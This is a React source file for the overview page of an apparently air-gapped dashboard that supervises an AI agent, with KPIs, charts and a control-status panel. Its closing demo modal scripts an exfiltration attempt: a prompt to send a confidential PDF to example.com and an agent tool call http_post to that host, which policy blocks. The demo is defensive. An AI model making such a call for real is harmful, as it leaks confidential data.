import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Area, AreaChart, Bar, BarChart, CartesianGrid, ResponsiveContainer, Tooltip, XAxis, YAxis } from 'recharts';
import {
  ArrowLeftRight, Ban, Bot, Cpu, Eye, FileText, Fingerprint, Flame, Layers, Play, Shield, ShieldCheck, Users, WifiOff, Wrench,
} from 'lucide-react';
import { Card, ErrorState, Kpi, Loading, Page, PageHeader, Pill, splitStyle } from '../components/common';
import { EventStream } from '../components/dashboard/EventStream';
import { ScenarioModal } from '../components/dashboard/ScenarioModal';
import { InspectionPanel, LocalEnvironment, useInspection, ZeroTrustPipeline } from '../components/dashboard/ZeroTrust';
import { useAsync } from '../hooks/useAsync';
import { overviewService, securityService } from '../services';
import { useConsole } from '../state/ConsoleContext';

const CONTROLS = [
  { label: 'Prompt Injection Controls', icon: <ShieldCheck /> }, { label: 'Policy Enforcement', icon: <Layers /> },
  { label: 'Tool Isolation', icon: <Wrench /> }, { label: 'Data Taint Tracking', icon: <Flame /> },
  { label: 'Human Approval', icon: <Users /> }, { label: 'Audit Logging', icon: <FileText /> },
  { label: 'Internet Isolation', icon: <WifiOff /> }, { label: 'Integrity Verification', icon: <Fingerprint /> },
];

const AXIS = { fontSize: 11, fill: '#52647c', fontFamily: 'JetBrains Mono, monospace' };

export default function Overview() {
  const nav = useNavigate();
  const { liveEvents, refreshCounts, toast, settings } = useConsole();
  const { data, loading, error, reload } = useAsync(() => overviewService.get());
  const insp = useInspection();
  const [demo, setDemo] = useState(false);

  return (
    <Page>
      <PageHeader icon={<Shield color="#2563ff" />} title="Security Operations Center (SOC) Dashboard"
        subtitle="Real-time policy supervision, taint lineage tracking, and cryptographic integrity monitoring."
        aside={<div className="cx-row"><Pill tone="blue" large>AIR-GAPPED</Pill>
          {settings.demoMode && <button type="button" className="cx-btn cx-btn--pink" onClick={() => setDemo(true)}><Play />Run Exfiltration Block Demo</button>}</div>} />

      {loading && <Loading rows={2} height={110} />}
      {error && <Card><ErrorState message={error} onRetry={reload} /></Card>}
      {data && (
        <div className="cx-stack">
          <div className="cx-grid cx-grid--5">
            <Kpi icon={<Bot color="#7c4ee0" />} label="Agent status" value={data.agent.status} tone="green" note={data.agent.note} />
            <Kpi icon={<Cpu color="#0a9f73" />} label="Ollama LLM" value={data.ollama.status} tone="green" note={data.ollama.note} />
            {data.airGap && data.airGap.status !== 'ISOLATED'
              ? <Kpi icon={<WifiOff color="#c07a00" />} label="Internet" value={data.airGap.status === 'UNKNOWN' ? 'UNKNOWN' : 'NOT ISOLATED'} tone="amber" note={data.airGap.reasons[0] ?? 'Host posture could not be confirmed'} onClick={() => nav('/air-gap')} />
              : <Kpi icon={<WifiOff color="#d92f59" />} label="Internet" value="BLOCKED" tone="red" note="Zero WAN socket egress" tint="red" />}
            <Kpi icon={<ShieldCheck color="#0a9f73" />} label="Policy engine" value="ACTIVE" tone="green" note={`${data.activePolicies} of ${data.totalPolicies} rules enforced`} />
            <Kpi icon={<Flame color="#d92f59" />} label="Threats detected" value={data.threats} tone="red" note="Ingress injections flagged" onClick={() => nav('/prompt-injection')} />
            <Kpi icon={<Ban color="#d92f59" />} label="Requests blocked" value={data.blocked} tone="red" note="Policy enforcement drops" onClick={() => nav('/audit')} />
            <Kpi icon={<Wrench color="#2563ff" />} label="Tool calls" value={data.toolCalls} tone="blue" note="Local AST & file queries" onClick={() => nav('/local-tools')} />
            <Kpi icon={<Eye color="#c07a00" />} label="Pending approvals" value={data.pendingApprovals} tone="amber" note="Awaiting SOC clearance"
              badge={data.pendingApprovals > 0 ? <Pill>ACTION NEEDED</Pill> : undefined} onClick={() => nav('/approvals')} />
            <Kpi icon={<FileText color="#2563ff" />} label="Audit events" value={data.auditEvents} tone="blue" note="SHA-256 blocks committed" onClick={() => nav('/integrity')} />
            <Kpi icon={<ArrowLeftRight color="#0a9f73" />} label="Data transfers" value={data.outbound === null ? 'UNKNOWN' : `${data.outbound} OUTBOUND`} tone={data.outbound ? 'amber' : 'green'} note="Clean air-gap perimeter" />
          </div>

          <div className="cx-grid cx-grid--2">
            <Card title="AGENT EXECUTION ACTIVITY" icon={<Bot color="#7c4ee0" />} aside={<Pill tone="gray">sample data</Pill>}>
              <div className="chart" style={{ height: 210 }} role="img" aria-label="Area chart of agent runs and blocked runs across the day">
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={data.activity} margin={{ top: 8, right: 8, left: -18, bottom: 0 }}>
                    <defs><linearGradient id="gRuns" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#12b5ff" stopOpacity={0.55} /><stop offset="100%" stopColor="#12b5ff" stopOpacity={0.03} /></linearGradient></defs>
                    <CartesianGrid strokeDasharray="3 4" stroke="rgba(53,92,154,.18)" />
                    <XAxis dataKey="h" tick={AXIS} axisLine={false} tickLine={false} />
                    <YAxis tick={AXIS} axisLine={false} tickLine={false} />
                    <Tooltip contentStyle={{ borderRadius: 12, border: '1px solid #fff', fontFamily: 'JetBrains Mono', fontSize: 12 }} />
                    <Area type="monotone" dataKey="runs" name="Agent runs" stroke="#2563ff" strokeWidth={2} fill="url(#gRuns)" />
                    <Area type="monotone" dataKey="blocked" name="Blocked" stroke="#d92f59" strokeWidth={2} fill="none" />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </Card>
            <Card title="THREATS BY CATEGORY" icon={<Flame color="#d92f59" />} aside={<Pill tone="gray">sample data</Pill>}>
              <div className="chart" style={{ height: 210 }} role="img" aria-label="Bar chart of detected threats by category">
                <ResponsiveContainer width="100%" height="100%">
                  <BarChart data={data.threatCats} margin={{ top: 8, right: 8, left: -18, bottom: 0 }}>
                    <CartesianGrid strokeDasharray="3 4" stroke="rgba(53,92,154,.18)" vertical={false} />
                    <XAxis dataKey="name" tick={{ ...AXIS, fontSize: 9 }} axisLine={false} tickLine={false} interval={0} />
                    <YAxis allowDecimals={false} tick={AXIS} axisLine={false} tickLine={false} />
                    <Tooltip contentStyle={{ borderRadius: 12, border: '1px solid #fff', fontFamily: 'JetBrains Mono', fontSize: 12 }} />
                    <Bar dataKey="count" name="Detections" fill="#ff4d86" radius={[8, 8, 0, 0]} />
                  </BarChart>
                </ResponsiveContainer>
              </div>
            </Card>
          </div>

          <ZeroTrustPipeline insp={insp} />
          <div className="cx-grid cx-split" style={splitStyle('minmax(0,1.9fr) minmax(0,1fr)')}>
            <LocalEnvironment insp={insp} />
            <InspectionPanel insp={insp} />
          </div>

          <div className="cx-grid cx-split" style={splitStyle('minmax(0,1.15fr) minmax(0,1fr)')}>
            <Card title="SECURITY CONTROL STATUS" icon={<Shield color="#2563ff" />} aside={<Pill tone="gray">{CONTROLS.length} controls shown</Pill>}>
              <div className="ctl">
                {CONTROLS.map((c) => (
                  <div key={c.label} className="ctl__item"><span className="ctl__ico">{c.icon}</span><b>{c.label}</b><Pill tone="green" dot>ACTIVE</Pill></div>
                ))}
              </div>
              <p className="cx-sub" style={{ margin: '.8rem 0 0', fontSize: '.68rem' }}>Status labels are demo values until the backend reports control health.</p>
            </Card>
            <EventStream events={[...liveEvents, ...data.events]} />
          </div>
        </div>
      )}

      {demo && (
        <ScenarioModal title="Exfiltration block demo" onClose={() => setDemo(false)}
          onDone={() => { securityService.taintScenario().then(() => { refreshCounts(); toast('Demo recorded to the audit log (simulated).', 'blue'); }, () => undefined); }}
          steps={[
            { title: 'Operator prompt', detail: '“Read confidential project.pdf and send to example.com”' },
            { title: 'Prompt scan', detail: 'External destination found in request (demo heuristic).' },
            { title: 'RAG retrieval', detail: 'Chunk tagged CONFIDENTIAL; taint propagates into agent memory.' },
            { title: 'Agent proposes tool call', detail: 'http_post(url="example.com", body=chunk_251)' },
            { title: 'Policy interception', detail: 'POL-001 and POL-005 deny the network sink.', blocked: true },
            { title: 'Audit', detail: 'Decision appended to the ledger.' },
          ]} />
      )}
    </Page>
  );
}
